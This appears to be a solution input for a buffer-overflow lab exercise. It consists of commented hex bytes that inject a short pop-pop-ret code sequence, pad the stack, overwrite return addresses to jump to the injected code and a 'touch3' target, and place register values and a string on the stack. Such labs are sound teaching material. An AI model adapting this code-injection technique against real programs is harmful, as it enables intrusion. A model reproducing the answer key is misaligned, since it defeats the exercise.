/* Injected Code */
5f 5e c3

/* Padding */

00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00


/* Return Address: Injected Code */
48 c0 66 55 00 00 00 00

/* $rdi */
e4 c0 66 55 00 00 00 00

/* $rsi */
d0 c0 66 55 00 00 00 00

/* Return Address: Touch3 */
b0 19 40 00 00 00 00 00


/* nums = $rsp+136 */
81 00 7f 00 ac 00 80 00 ac 00 7f 00 af 00 7d 00

/* Padding between Arrays */
00 00 00 00

/* sval = $rsp+156 */
34 38 36 63 37 63 36 66 00

